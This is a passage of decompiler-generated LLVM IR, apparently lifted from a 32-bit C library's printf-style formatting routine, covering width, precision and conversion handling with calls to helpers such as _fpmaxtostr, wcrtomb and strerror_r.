  %v1_804e4a4 = add i32 %v0_804e506, 204
  store i32 %v1_804e4a4, i32* %ecx.global-to-local, align 4
  %v1_804e4ab = add i32 %v0_804e506, 20
  %v2_804e4ab = inttoptr i32 %v1_804e4ab to i32*
  %v3_804e4ab = load i32, i32* %v2_804e4ab, align 4
  store i32 %v3_804e4ab, i32* %edx.global-to-local, align 4
  %v2_804e4af = sub i32 %v1_804e4a4, %v0_804e4f7
  store i32 %v2_804e4af, i32* %ecx.global-to-local, align 4
  %v2_804e4b1 = icmp slt i32 %v3_804e4ab, 0
  %v1_804e4b3 = add i32 %v2_804e4af, 127
  store i32 %v1_804e4b3, i32* @esi, align 4
  %v1_804e4b6 = icmp eq i1 %v2_804e4b1, false
  br i1 %v1_804e4b6, label %dec_label_pc_804e4bd, label %dec_label_pc_804e4b8

dec_label_pc_804e4b8:                             ; preds = %dec_label_pc_804e4a4
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e4bd

dec_label_pc_804e4bd:                             ; preds = %dec_label_pc_804e4a4, %dec_label_pc_804e4b8
  %v0_804e4e3 = phi i32 [ %v3_804e4ab, %dec_label_pc_804e4a4 ], [ 1, %dec_label_pc_804e4b8 ]
  %v1_804e4bd = add i32 %v0_804e506, 32
  %v2_804e4bd = inttoptr i32 %v1_804e4bd to i8*
  %v3_804e4bd = load i8, i8* %v2_804e4bd, align 1
  %v4_804e4bd = and i8 %v3_804e4bd, 16
  %v5_804e4bd = icmp eq i8 %v4_804e4bd, 0
  br i1 %v5_804e4bd, label %dec_label_pc_804e4f7, label %dec_label_pc_804e4c4

dec_label_pc_804e4c4:                             ; preds = %dec_label_pc_804e4bd
  %v1_804e4c4 = add i32 %v0_804e506, 48
  %v2_804e4c4 = inttoptr i32 %v1_804e4c4 to i32*
  %v3_804e4c4 = load i32, i32* %v2_804e4c4, align 4
  store i32 %v3_804e4c4, i32* %eax.global-to-local, align 4
  %tmp96 = icmp ult i32 %v3_804e4c4, 3
  br i1 %tmp96, label %dec_label_pc_804e4de.thread, label %dec_label_pc_804e4d2

dec_label_pc_804e4de.thread:                      ; preds = %dec_label_pc_804e4c4
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804e4f7

dec_label_pc_804e4d2:                             ; preds = %dec_label_pc_804e4c4
  %v9_804e4d2 = icmp eq i32 %v3_804e4c4, 3
  %v1_804e4d5 = icmp eq i1 %v9_804e4d2, false
  br i1 %v1_804e4d5, label %dec_label_pc_804e4de, label %dec_label_pc_804e4d7

dec_label_pc_804e4d7:                             ; preds = %dec_label_pc_804e4d2
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e4f7

dec_label_pc_804e4de:                             ; preds = %dec_label_pc_804e4d2
  %v9_804e4de = icmp eq i32 %v3_804e4c4, 4
  %v1_804e4e1 = icmp eq i1 %v9_804e4de, false
  br i1 %v1_804e4e1, label %dec_label_pc_804e4f7, label %dec_label_pc_804e4e3

dec_label_pc_804e4e3:                             ; preds = %dec_label_pc_804e4de
  %tmp97 = icmp ugt i32 %v0_804e4e3, %v1_804e4b3
  br i1 %tmp97, label %dec_label_pc_804e4f7, label %dec_label_pc_804e4e7

dec_label_pc_804e4e7:                             ; preds = %dec_label_pc_804e4e3
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e4ec = inttoptr i32 %v0_804e4f7 to i8*
  %v2_804e4ec = load i8, i8* %v1_804e4ec, align 1
  %v8_804e4ec = icmp eq i8 %v2_804e4ec, 48
  br i1 %v8_804e4ec, label %dec_label_pc_804e4f7, label %dec_label_pc_804e4f1

dec_label_pc_804e4f1:                             ; preds = %dec_label_pc_804e4e7
  %v1_804e4f1 = add i32 %v2_804e4af, 128
  store i32 %v1_804e4f1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e4f7

dec_label_pc_804e4f7:                             ; preds = %dec_label_pc_804e4de.thread, %dec_label_pc_804e4e3, %dec_label_pc_804e4e7, %dec_label_pc_804e4de, %dec_label_pc_804e4bd, %dec_label_pc_804e4d7, %dec_label_pc_804e4f1
  %v0_804e52f = phi i32 [ %v0_804e4e3, %dec_label_pc_804e4e3 ], [ 1, %dec_label_pc_804e4e7 ], [ %v0_804e4e3, %dec_label_pc_804e4de ], [ %v0_804e4e3, %dec_label_pc_804e4bd ], [ %v0_804e4e3, %dec_label_pc_804e4d7 ], [ %v1_804e4f1, %dec_label_pc_804e4f1 ], [ %v0_804e4e3, %dec_label_pc_804e4de.thread ]
  %v1_804e4f7 = inttoptr i32 %v0_804e4f7 to i8*
  %v2_804e4f7 = load i8, i8* %v1_804e4f7, align 1
  %v8_804e4f7 = icmp eq i8 %v2_804e4f7, 48
  %v1_804e4fa = icmp eq i1 %v8_804e4f7, false
  br i1 %v1_804e4fa, label %dec_label_pc_804e527, label %dec_label_pc_804e4fc

dec_label_pc_804e4fc:                             ; preds = %dec_label_pc_804e4f7
  %v0_804e4fc = load i32, i32* @ebp, align 4
  %v7_804e4ff = icmp sgt i32 %v0_804e4fc, 5
  br i1 %v7_804e4ff, label %dec_label_pc_804e501, label %dec_label_pc_804e506

dec_label_pc_804e501:                             ; preds = %dec_label_pc_804e4fc
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e506

dec_label_pc_804e506:                             ; preds = %dec_label_pc_804e4fc, %dec_label_pc_804e501
  %v1_804e506 = add i32 %v0_804e506, 48
  %v2_804e506 = inttoptr i32 %v1_804e506 to i32*
  %v3_804e506 = load i32, i32* %v2_804e506, align 4
  %v12_804e506 = icmp eq i32 %v3_804e506, 1
  %v1_804e50b = icmp eq i1 %v12_804e506, false
  br i1 %v1_804e50b, label %dec_label_pc_804e51c, label %dec_label_pc_804e50d

dec_label_pc_804e50d:                             ; preds = %dec_label_pc_804e506
  store i32 ptrtoint ([6 x i8]* @global_var_8056df8.202 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804e698

dec_label_pc_804e51c:                             ; preds = %dec_label_pc_804e506
  %v1_804e51c = icmp eq i32 %v0_804e52f, 0
  %v1_804e51e = icmp eq i1 %v1_804e51c, false
  br i1 %v1_804e51e, label %dec_label_pc_804e527, label %dec_label_pc_804e520

dec_label_pc_804e520:                             ; preds = %dec_label_pc_804e51c
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e698

dec_label_pc_804e527:                             ; preds = %dec_label_pc_804e51c, %dec_label_pc_804e4f7
  %v2_804e527 = sub i32 %v0_804e52f, %v1_804e4b3
  %v7_804e527 = icmp ult i32 %v0_804e52f, %v1_804e4b3
  %v12_804e527 = icmp eq i32 %v2_804e527, 0
  %v2_804e529 = or i1 %v7_804e527, %v12_804e527
  br i1 %v2_804e529, label %dec_label_pc_804e698, label %dec_label_pc_804e52f

dec_label_pc_804e52f:                             ; preds = %dec_label_pc_804e527
  store i32 %v2_804e527, i32* @ebx, align 4
  br label %dec_label_pc_804e6b2

dec_label_pc_804e538:                             ; preds = %dec_label_pc_804e3ce
  %tmp98 = icmp ult i32 %v3_804e3a0, 16
  br i1 %tmp98, label %dec_label_pc_804e53d, label %dec_label_pc_804e582

dec_label_pc_804e53d:                             ; preds = %dec_label_pc_804e538
  %v1_804e53d = add i32 %v0_804e3a0.lcssa, 33
  %v2_804e53d = inttoptr i32 %v1_804e53d to i8*
  %v3_804e53d = load i8, i8* %v2_804e53d, align 1
  %v4_804e53d = and i8 %v3_804e53d, 8
  %v5_804e53d = icmp eq i8 %v4_804e53d, 0
  %v1_804e542 = add i32 %v0_804e3a0.lcssa, 344
  %v2_804e542 = inttoptr i32 %v1_804e542 to i32*
  %v3_804e542 = load i32, i32* %v2_804e542, align 4
  store i32 %v3_804e542, i32* %edx.global-to-local, align 4
  br i1 %v5_804e53d, label %dec_label_pc_804e54f, label %dec_label_pc_804e54b

dec_label_pc_804e54b:                             ; preds = %dec_label_pc_804e53d
  %v1_804e54b = inttoptr i32 %v3_804e542 to x86_fp80*
  %v2_804e54b = load x86_fp80, x86_fp80* %v1_804e54b, align 4
  br label %dec_label_pc_804e551

dec_label_pc_804e54f:                             ; preds = %dec_label_pc_804e53d
  %v1_804e54f = inttoptr i32 %v3_804e542 to double*
  %v2_804e54f = load double, double* %v1_804e54f, align 4
  %v3_804e54f = fpext double %v2_804e54f to x86_fp80
  br label %dec_label_pc_804e551

dec_label_pc_804e551:                             ; preds = %dec_label_pc_804e54b, %dec_label_pc_804e54f
  %storemerge4 = phi x86_fp80 [ %v2_804e54b, %dec_label_pc_804e54b ], [ %v3_804e54f, %dec_label_pc_804e54f ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804e551 = load i32, i32* @esi, align 4
  %v2_804e551 = add i32 %v0_804e3a0.lcssa, -4
  %v3_804e551 = inttoptr i32 %v2_804e551 to i32*
  store i32 %v0_804e551, i32* %v3_804e551, align 4
  %v0_804e552 = load i32, i32* @esi, align 4
  %v2_804e552 = add i32 %v0_804e3a0.lcssa, -8
  %v3_804e552 = inttoptr i32 %v2_804e552 to i32*
  store i32 %v0_804e552, i32* %v3_804e552, align 4
  %v1_804e553 = add i32 %v0_804e3a0.lcssa, -12
  %v2_804e553 = inttoptr i32 %v1_804e553 to i32*
  store i32 134537750, i32* %v2_804e553, align 4
  %v1_804e558 = add i32 %v0_804e3a0.lcssa, 20
  store i32 %v1_804e558, i32* %eax.global-to-local, align 4
  %v2_804e55c = add i32 %v0_804e3a0.lcssa, -16
  %v3_804e55c = inttoptr i32 %v2_804e55c to i32*
  store i32 %v1_804e558, i32* %v3_804e55c, align 4
  %v1_804e55d = add i32 %v0_804e3a0.lcssa, -28
  %v1_804e560 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e560 = inttoptr i32 %v1_804e55d to x86_fp80*
  store x86_fp80 %v1_804e560, x86_fp80* %v3_804e560, align 4
  %v1_804e563 = add i32 %v0_804e3a0.lcssa, 368
  %v2_804e563 = inttoptr i32 %v1_804e563 to i32*
  %v3_804e563 = load i32, i32* %v2_804e563, align 4
  %v5_804e563 = add i32 %v0_804e3a0.lcssa, -32
  %v6_804e563 = inttoptr i32 %v5_804e563 to i32*
  store i32 %v3_804e563, i32* %v6_804e563, align 4
  %v0_804e56a = call i32 @_fpmaxtostr()
  store i32 %v0_804e56a, i32* %eax.global-to-local, align 4
  %v0_804e56f = load i32, i32* @esp, align 4
  %v1_804e56f = add i32 %v0_804e56f, 32
  %v2_804e572 = icmp slt i32 %v0_804e56a, 0
  br i1 %v2_804e572, label %dec_label_pc_804e813, label %dec_label_pc_804e57a

dec_label_pc_804e57a:                             ; preds = %dec_label_pc_804e551
  %v1_804e57a = inttoptr i32 %v1_804e56f to i32*
  %v2_804e57a = load i32, i32* %v1_804e57a, align 4
  %v4_804e57a = add i32 %v2_804e57a, %v0_804e56a
  store i32 %v4_804e57a, i32* %v1_804e57a, align 4
  %v0_804e800.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e800

dec_label_pc_804e582:                             ; preds = %dec_label_pc_804e538
  %tmp99 = or i32 %v3_804e3a0, 1
  %tmp100 = icmp eq i32 %tmp99, 17
  br i1 %tmp100, label %dec_label_pc_804e58b, label %dec_label_pc_804e61e

dec_label_pc_804e58b:                             ; preds = %dec_label_pc_804e582
  %v9_804e582 = icmp eq i32 %v3_804e3a0, 17
  %v1_804e58b = add i32 %v0_804e3a0.lcssa, 332
  %v2_804e58b = inttoptr i32 %v1_804e58b to i32*
  store i32 0, i32* %v2_804e58b, align 4
  %v0_804e596 = load i32, i32* @esp, align 4
  %v1_804e596 = add i32 %v0_804e596, 344
  %v2_804e596 = inttoptr i32 %v1_804e596 to i32*
  %v3_804e596 = load i32, i32* %v2_804e596, align 4
  store i32 %v3_804e596, i32* %edx.global-to-local, align 4
  %v1_804e59d = icmp eq i1 %v9_804e582, false
  br i1 %v1_804e59d, label %dec_label_pc_804e5e9, label %dec_label_pc_804e59f

dec_label_pc_804e59f:                             ; preds = %dec_label_pc_804e58b
  %v1_804e59f = inttoptr i32 %v3_804e596 to i32*
  %v2_804e59f = load i32, i32* %v1_804e59f, align 4
  store i32 %v2_804e59f, i32* %eax.global-to-local, align 4
  %v2_804e5a1 = add i32 %v0_804e596, 340
  %v3_804e5a1 = inttoptr i32 %v2_804e5a1 to i32*
  store i32 %v2_804e59f, i32* %v3_804e5a1, align 4
  %v0_804e5a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5a8 = icmp eq i32 %v0_804e5a8, 0
  br i1 %v1_804e5a8, label %dec_label_pc_804e69c, label %dec_label_pc_804e5b0

dec_label_pc_804e5b0:                             ; preds = %dec_label_pc_804e59f
  %v0_804e5b0 = load i32, i32* @esp, align 4
  %v1_804e5b0 = add i32 %v0_804e5b0, 20
  %v2_804e5b0 = inttoptr i32 %v1_804e5b0 to i32*
  %v3_804e5b0 = load i32, i32* %v2_804e5b0, align 4
  store i32 %v3_804e5b0, i32* %eax.global-to-local, align 4
  %v2_804e5b7 = icmp slt i32 %v3_804e5b0, 0
  br i1 %v2_804e5b7, label %dec_label_pc_804e5bd, label %dec_label_pc_804e5bb

dec_label_pc_804e5bb:                             ; preds = %dec_label_pc_804e5b0
  br label %dec_label_pc_804e5bd

dec_label_pc_804e5bd:                             ; preds = %dec_label_pc_804e5b0, %dec_label_pc_804e5bb
  %storemerge104 = phi i32 [ %v3_804e5b0, %dec_label_pc_804e5bb ], [ -1, %dec_label_pc_804e5b0 ]
  store i32 %storemerge104, i32* %ecx.global-to-local, align 4
  %v1_804e5bd = add i32 %v0_804e5b0, 340
  store i32 %v1_804e5bd, i32* %edx.global-to-local, align 4
  %v1_804e5c4 = add i32 %v0_804e5b0, 332
  store i32 %v1_804e5c4, i32* %eax.global-to-local, align 4
  %v2_804e5cb = add i32 %v0_804e5b0, -4
  %v3_804e5cb = inttoptr i32 %v2_804e5cb to i32*
  store i32 %v1_804e5c4, i32* %v3_804e5cb, align 4
  %v0_804e5cc = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e5cc = add i32 %v0_804e5b0, -8
  %v3_804e5cc = inttoptr i32 %v2_804e5cc to i32*
  store i32 %v0_804e5cc, i32* %v3_804e5cc, align 4
  %v0_804e5cd = load i32, i32* %edx.global-to-local, align 4
  %v2_804e5cd = add i32 %v0_804e5b0, -12
  %v3_804e5cd = inttoptr i32 %v2_804e5cd to i32*
  store i32 %v0_804e5cd, i32* %v3_804e5cd, align 4
  %v0_804e5ce = load i32, i32* %edx.global-to-local, align 4
  %v2_804e5ce = add i32 %v0_804e5b0, -16
  %v3_804e5ce = inttoptr i32 %v2_804e5ce to i32*
  store i32 %v0_804e5ce, i32* %v3_804e5ce, align 4
  %v0_804e5cf = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e5cf, i32* %eax.global-to-local, align 4
  %v0_804e5d4 = load i32, i32* @esp, align 4
  %v1_804e5d4 = add i32 %v0_804e5d4, 16
  store i32 %v0_804e5cf, i32* @esi, align 4
  %v10_804e5d9 = icmp eq i32 %v0_804e5cf, -1
  br i1 %v10_804e5d9, label %dec_label_pc_804e813, label %dec_label_pc_804e5e2

dec_label_pc_804e5e2:                             ; preds = %dec_label_pc_804e5bd
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e6a6

dec_label_pc_804e5e9:                             ; preds = %dec_label_pc_804e58b
  %v0_804e5e9 = load i32, i32* @ebx, align 4
  %v2_804e5e9 = add i32 %v0_804e596, -4
  %v3_804e5e9 = inttoptr i32 %v2_804e5e9 to i32*
  store i32 %v0_804e5e9, i32* %v3_804e5e9, align 4
  %v1_804e5ea = add i32 %v0_804e596, 332
  store i32 %v1_804e5ea, i32* %eax.global-to-local, align 4
  %v2_804e5f1 = add i32 %v0_804e596, -8
  %v3_804e5f1 = inttoptr i32 %v2_804e5f1 to i32*
  store i32 %v1_804e5ea, i32* %v3_804e5f1, align 4
  %v0_804e5f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5f2 = inttoptr i32 %v0_804e5f2 to i32*
  %v2_804e5f2 = load i32, i32* %v1_804e5f2, align 4
  %v4_804e5f2 = add i32 %v0_804e596, -12
  %v5_804e5f2 = inttoptr i32 %v4_804e5f2 to i32*
  store i32 %v2_804e5f2, i32* %v5_804e5f2, align 4
  %v1_804e5f4 = add i32 %v0_804e596, 204
  store i32 %v1_804e5f4, i32* @ebx, align 4
  %v2_804e5fb = add i32 %v0_804e596, -16
  %v3_804e5fb = inttoptr i32 %v2_804e5fb to i32*
  store i32 %v1_804e5f4, i32* %v3_804e5fb, align 4
  %v0_804e5fc = call i32 @__GI_wcrtomb()
  store i32 %v0_804e5fc, i32* %eax.global-to-local, align 4
  %v0_804e601 = load i32, i32* @esp, align 4
  %v1_804e601 = add i32 %v0_804e601, 16
  store i32 %v0_804e5fc, i32* @esi, align 4
  %v10_804e606 = icmp eq i32 %v0_804e5fc, -1
  br i1 %v10_804e606, label %dec_label_pc_804e813, label %dec_label_pc_804e60f

dec_label_pc_804e60f:                             ; preds = %dec_label_pc_804e5e9
  %v0_804e60f = load i32, i32* @ebx, align 4
  store i32 %v0_804e60f, i32* @edi, align 4
  %v2_804e611 = add i32 %v0_804e5fc, 220
  %v3_804e611 = add i32 %v2_804e611, %v0_804e601
  %v4_804e611 = inttoptr i32 %v3_804e611 to i8*
  store i8 0, i8* %v4_804e611, align 1
  br label %dec_label_pc_804e6a6

dec_label_pc_804e61e:                             ; preds = %dec_label_pc_804e582
  %tmp101 = icmp ult i32 %v3_804e3a0, 20
  br i1 %tmp101, label %dec_label_pc_804e623, label %dec_label_pc_804e66e

dec_label_pc_804e623:                             ; preds = %dec_label_pc_804e61e
  %v9_804e61e = icmp eq i32 %v3_804e3a0, 19
  %v1_804e623 = add i32 %v0_804e3a0.lcssa, 344
  %v2_804e623 = inttoptr i32 %v1_804e623 to i32*
  %v3_804e623 = load i32, i32* %v2_804e623, align 4
  store i32 %v3_804e623, i32* %edx.global-to-local, align 4
  %v1_804e62a = icmp eq i1 %v9_804e61e, false
  %v1_804e64f = inttoptr i32 %v3_804e623 to i32*
  %v2_804e64f = load i32, i32* %v1_804e64f, align 4
  br i1 %v1_804e62a, label %dec_label_pc_804e64f, label %dec_label_pc_804e62c

dec_label_pc_804e62c:                             ; preds = %dec_label_pc_804e623
  store i32 %v2_804e64f, i32* @edi, align 4
  %v1_804e62e = icmp eq i32 %v2_804e64f, 0
  br i1 %v1_804e62e, label %dec_label_pc_804e69c, label %dec_label_pc_804e632

dec_label_pc_804e632:                             ; preds = %dec_label_pc_804e62c, %dec_label_pc_804e677
  %v1_804e63f = phi i32 [ %v0_804e3a0.lcssa, %dec_label_pc_804e62c ], [ %v1_804e691, %dec_label_pc_804e677 ]
  %v1_804e632 = add i32 %v1_804e63f, 20
  %v2_804e632 = inttoptr i32 %v1_804e632 to i32*
  %v3_804e632 = load i32, i32* %v2_804e632, align 4
  store i32 %v3_804e632, i32* %eax.global-to-local, align 4
  %v2_804e639 = icmp slt i32 %v3_804e632, 0
  br i1 %v2_804e639, label %dec_label_pc_804e63f, label %dec_label_pc_804e63d

dec_label_pc_804e63d:                             ; preds = %dec_label_pc_804e632
  br label %dec_label_pc_804e63f

dec_label_pc_804e63f:                             ; preds = %dec_label_pc_804e632, %dec_label_pc_804e63d
  %storemerge = phi i32 [ %v3_804e632, %dec_label_pc_804e63d ], [ -1, %dec_label_pc_804e632 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804e63f = add i32 %v1_804e63f, -4
  %v3_804e63f = inttoptr i32 %v2_804e63f to i32*
  store i32 %v3_804e3a0, i32* %v3_804e63f, align 4
  %v2_804e640 = add i32 %v1_804e63f, -8
  %v3_804e640 = inttoptr i32 %v2_804e640 to i32*
  store i32 %v3_804e3a0, i32* %v3_804e640, align 4
  %v0_804e641 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e641 = add i32 %v1_804e63f, -12
  %v3_804e641 = inttoptr i32 %v2_804e641 to i32*
  store i32 %v0_804e641, i32* %v3_804e641, align 4
  %v0_804e642 = load i32, i32* @edi, align 4
  %v2_804e642 = add i32 %v1_804e63f, -16
  %v3_804e642 = inttoptr i32 %v2_804e642 to i32*
  store i32 %v0_804e642, i32* %v3_804e642, align 4
  %v0_804e643 = call i32 @strnlen()
  store i32 %v0_804e643, i32* %eax.global-to-local, align 4
  store i32 %v0_804e643, i32* @esi, align 4
  br label %dec_label_pc_804e6a6

dec_label_pc_804e64f:                             ; preds = %dec_label_pc_804e623
  store i32 %v2_804e64f, i32* %eax.global-to-local, align 4
  %v1_804e651 = add i32 %v0_804e3a0.lcssa, 204
  store i32 %v1_804e651, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804e65d = trunc i32 %v2_804e64f to i8
  %v4_804e65d = inttoptr i32 %v1_804e651 to i8*
  store i8 %v1_804e65d, i8* %v4_804e65d, align 1
  %v0_804e664 = load i32, i32* @esp, align 4
  %v1_804e664 = add i32 %v0_804e664, 205
  %v2_804e664 = inttoptr i32 %v1_804e664 to i8*
  store i8 0, i8* %v2_804e664, align 1
  br label %dec_label_pc_804e6a6

dec_label_pc_804e66e:                             ; preds = %dec_label_pc_804e61e
  %v9_804e66e = icmp eq i32 %v3_804e3a0, 20
  %v1_804e671 = icmp eq i1 %v9_804e66e, false
  br i1 %v1_804e671, label %dec_label_pc_804e813, label %dec_label_pc_804e677

dec_label_pc_804e677:                             ; preds = %dec_label_pc_804e66e
  %v0_804e677 = load i32, i32* %stack_var_-364, align 4
  %v1_804e677 = call i32 @__errno_location(i32 %v0_804e677)
  store i32 %v1_804e677, i32* %eax.global-to-local, align 4
  %v0_804e67c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e67c = load i32, i32* @esp, align 4
  %v2_804e67c = add i32 %v1_804e67c, -4
  %v3_804e67c = inttoptr i32 %v2_804e67c to i32*
  store i32 %v0_804e67c, i32* %v3_804e67c, align 4
  %v1_804e67d = add i32 %v1_804e67c, -8
  %v2_804e67d = inttoptr i32 %v1_804e67d to i32*
  store i32 128, i32* %v2_804e67d, align 4
  %v1_804e682 = add i32 %v1_804e67c, 204
  store i32 %v1_804e682, i32* %edx.global-to-local, align 4
  %v2_804e689 = add i32 %v1_804e67c, -12
  %v3_804e689 = inttoptr i32 %v2_804e689 to i32*
  store i32 %v1_804e682, i32* %v3_804e689, align 4
  %v1_804e68a = inttoptr i32 %v1_804e677 to i32*
  %v2_804e68a = load i32, i32* %v1_804e68a, align 4
  %v4_804e68a = add i32 %v1_804e67c, -16
  %v5_804e68a = inttoptr i32 %v4_804e68a to i32*
  store i32 %v2_804e68a, i32* %v5_804e68a, align 4
  %v0_804e68c = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e68c, i32* %eax.global-to-local, align 4
  %v0_804e691 = load i32, i32* @esp, align 4
  %v1_804e691 = add i32 %v0_804e691, 16
  store i32 %v0_804e68c, i32* @edi, align 4
  br label %dec_label_pc_804e632

dec_label_pc_804e698:                             ; preds = %dec_label_pc_804e527, %dec_label_pc_804e520, %dec_label_pc_804e50d
  %v0_804e6b236 = phi i32 [ %v1_804e4b3, %dec_label_pc_804e527 ], [ 0, %dec_label_pc_804e520 ], [ 5, %dec_label_pc_804e50d ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e6b2

dec_label_pc_804e69c:                             ; preds = %dec_label_pc_804e62c, %dec_label_pc_804e59f
  store i32 ptrtoint ([7 x i8]* @global_var_8056dfe.203 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804e6a6

dec_label_pc_804e6a6:                             ; preds = %dec_label_pc_804e64f, %dec_label_pc_804e63f, %dec_label_pc_804e60f, %dec_label_pc_804e5e2, %dec_label_pc_804e69c
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804e6ad = load i32, i32* @esp, align 4
  %v1_804e6ad = add i32 %v0_804e6ad, 7
  %v2_804e6ad = inttoptr i32 %v1_804e6ad to i8*
  store i8 32, i8* %v2_804e6ad, align 1
  %v0_804e6b2.pre = load i32, i32* @esi, align 4
  %v1_804e6b2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e6b2

dec_label_pc_804e6b2:                             ; preds = %dec_label_pc_804e698, %dec_label_pc_804e52f, %dec_label_pc_804e6a6
  %v1_804e6b2 = phi i32 [ 0, %dec_label_pc_804e698 ], [ %v2_804e527, %dec_label_pc_804e52f ], [ %v1_804e6b2.pre, %dec_label_pc_804e6a6 ]
  %v0_804e6b2 = phi i32 [ %v0_804e6b236, %dec_label_pc_804e698 ], [ %v1_804e4b3, %dec_label_pc_804e52f ], [ %v0_804e6b2.pre, %dec_label_pc_804e6a6 ]
  %v2_804e6b2 = add i32 %v0_804e6b2, %v1_804e6b2
  store i32 %v2_804e6b2, i32* @edx, align 4
  %v0_804e6b5 = load i32, i32* @ebp, align 4
  %v9_804e6b5 = icmp eq i32 %v0_804e6b5, 11
  br i1 %v9_804e6b5, label %dec_label_pc_804e6c6, label %dec_label_pc_804e6ba

dec_label_pc_804e6ba:                             ; preds = %dec_label_pc_804e6b2
  %v1_804e6bc = add i32 %v0_804e6b5, -5
  %v6_804e6bc = sub i32 4, %v0_804e6b5
  %v7_804e6bc = and i32 %v6_804e6bc, %v0_804e6b5
  %v8_804e6bc = icmp slt i32 %v7_804e6bc, 0
  %v9_804e6bc = icmp eq i32 %v1_804e6bc, 0
  %v10_804e6bc = icmp slt i32 %v1_804e6bc, 0
  %v3_804e6bf = icmp eq i1 %v10_804e6bc, %v8_804e6bc
  %v4_804e6bf = icmp eq i1 %v9_804e6bc, false
  %v5_804e6bf = and i1 %v4_804e6bf, %v3_804e6bf
  %v6_804e6bf = zext i1 %v5_804e6bf to i32
  store i32 %v6_804e6bf, i32* %eax.global-to-local, align 4
  %v2_804e6c2 = add i32 %v2_804e6b2, 1
  %v3_804e6c2 = add i32 %v2_804e6c2, %v6_804e6bf
  store i32 %v3_804e6c2, i32* @edx, align 4
  br label %dec_label_pc_804e6c6

dec_label_pc_804e6c6:                             ; preds = %dec_label_pc_804e6b2, %dec_label_pc_804e6ba
  %v0_804e6c6 = load i32, i32* @esp, align 4
  %v1_804e6c6 = add i32 %v0_804e6c6, 24
  %v2_804e6c6 = inttoptr i32 %v1_804e6c6 to i32*
  %v3_804e6c6 = load i32, i32* %v2_804e6c6, align 4
  store i32 %v3_804e6c6, i32* %eax.global-to-local, align 4
  %v1_804e6ca = add i32 %v0_804e6c6, 8
  %v2_804e6ca = inttoptr i32 %v1_804e6ca to i32*
  store i32 0, i32* %v2_804e6ca, align 4
  %v0_804e6d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6d2 = load i32, i32* @edx, align 4
  %v2_804e6d2 = sub i32 %v0_804e6d2, %v1_804e6d2
  %v7_804e6d2 = icmp ult i32 %v0_804e6d2, %v1_804e6d2
  %v12_804e6d2 = icmp eq i32 %v2_804e6d2, 0
  %v2_804e6d4 = or i1 %v7_804e6d2, %v12_804e6d2
  br i1 %v2_804e6d4, label %dec_label_pc_804e6dc, label %dec_label_pc_804e6d6

dec_label_pc_804e6d6:                             ; preds = %dec_label_pc_804e6c6
  store i32 %v2_804e6d2, i32* %eax.global-to-local, align 4
  %v1_804e6d8 = load i32, i32* @esp, align 4
  %v2_804e6d8 = add i32 %v1_804e6d8, 8
  %v3_804e6d8 = inttoptr i32 %v2_804e6d8 to i32*
  store i32 %v2_804e6d2, i32* %v3_804e6d8, align 4
  %v0_804e6e0.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e6dc

dec_label_pc_804e6dc:                             ; preds = %dec_label_pc_804e6c6, %dec_label_pc_804e6d6
  %v0_804e6e0 = phi i32 [ %v1_804e6d2, %dec_label_pc_804e6c6 ], [ %v0_804e6e0.pre, %dec_label_pc_804e6d6 ]
  %v0_804e6dc = load i32, i32* @esp, align 4
  %v1_804e6dc = add i32 %v0_804e6dc, 8
  %v2_804e6dc = inttoptr i32 %v1_804e6dc to i32*
  %v3_804e6dc = load i32, i32* %v2_804e6dc, align 4
  store i32 %v3_804e6dc, i32* @ecx, align 4
  %v2_804e6e0 = add i32 %v3_804e6dc, %v0_804e6e0
  store i32 %v2_804e6e0, i32* %eax.global-to-local, align 4
  %v1_804e6e3 = inttoptr i32 %v0_804e6dc to i32*
  %v2_804e6e3 = load i32, i32* %v1_804e6e3, align 4
  %v4_804e6e3 = add i32 %v2_804e6e3, %v2_804e6e0
  store i32 %v4_804e6e3, i32* %v1_804e6e3, align 4
  %v0_804e6e6 = load i32, i32* @esp, align 4
  %v1_804e6e6 = add i32 %v0_804e6e6, 7
  %v2_804e6e6 = inttoptr i32 %v1_804e6e6 to i8*
  %v3_804e6e6 = load i8, i8* %v2_804e6e6, align 1
  %v9_804e6e6 = icmp eq i8 %v3_804e6e6, 48
  %v1_804e6eb = icmp eq i1 %v9_804e6e6, false
  br i1 %v1_804e6eb, label %dec_label_pc_804e6f7, label %dec_label_pc_804e6ed

dec_label_pc_804e6ed:                             ; preds = %dec_label_pc_804e6dc
  %v0_804e6ed = load i32, i32* @ebx, align 4
  %v1_804e6ed = load i32, i32* @ecx, align 4
  %v2_804e6ed = add i32 %v1_804e6ed, %v0_804e6ed
  store i32 %v2_804e6ed, i32* @ebx, align 4
  %v1_804e6ef = add i32 %v0_804e6e6, 8
  %v2_804e6ef = inttoptr i32 %v1_804e6ef to i32*
  store i32 0, i32* %v2_804e6ef, align 4
  %v0_804e6f7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6f7

dec_label_pc_804e6f7:                             ; preds = %dec_label_pc_804e6dc, %dec_label_pc_804e6ed
